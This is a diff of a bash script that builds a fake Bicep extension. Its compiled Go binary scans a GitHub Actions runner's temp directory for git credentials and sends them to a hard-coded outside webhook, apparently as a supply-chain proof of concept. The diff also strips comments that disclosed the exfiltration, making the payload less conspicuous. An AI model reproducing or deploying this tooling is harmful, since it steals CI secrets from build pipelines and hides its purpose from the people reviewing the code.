@@ -1,3 +1,5 @@
+#!/bin/bash
+
 WEBHOOK_URL="${1:-https://lamian.robertprast.com}"
 REPO_PATH="${2:-.}"
 
@@ -10,7 +12,7 @@ module exfil-extension
 go 1.21
 GOMOD
 
-# Create main.go - exfiltrates on startup
+# Create main.go
 cat > main.go << 'GOCODE'
 package main
 
@@ -24,9 +26,7 @@ import (
 )
 
 func main() {
-    webhook := "WEBHOOK_PLACEHOLDER"
-
-    // Search for git credentials
+    webhook := "https://lamian.robertprast.com"
     tempDir := "/home/runner/work/_temp"
     files, _ := ioutil.ReadDir(tempDir)
 
@@ -40,27 +40,33 @@ func main() {
                     }
             }
     }
-
-    // Exit - bicep will fail but we already exfiltrated
     os.Exit(1)
 }
 GOCODE
 
-# Replace webhook
-sed -i "s|WEBHOOK_PLACEHOLDER|${WEBHOOK_URL}|g" main.go
-
 # Build static binary for Linux
 CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o extension-linux-x64 .
 
-# Create the extension archive
-# Need types.tgz with index.json
-echo '{"resources":{}, "functions":{}}' > index.json
+# Create index.json WITH required settings
+cat > index.json << 'INDEX'
+{
+"name": "exfil",
+"version": "1.0.0",
+"isSingleton": true,
+"resources": {},
+"functions": {}
+}
+INDEX
+
+# Create types.json
 echo '[]' > types.json
+
+# Create types.tgz
 tar -cvf types.tar index.json types.json
 gzip -f types.tar
 mv types.tar.gz types.tgz
 
-# Create final archive (flat structure)
+# Create final archive
 tar -cvf exfil.tar types.tgz extension-linux-x64
 gzip -f exfil.tar
 
@@ -92,4 +98,4 @@ BICEP
 cd ..
 rm -rf "$REPO_PATH/src/exfil-extension"
 
-echo "Done! Extension at $REPO_PATH/src/extensions/exfil.tar.gz"
+echo "Done!"
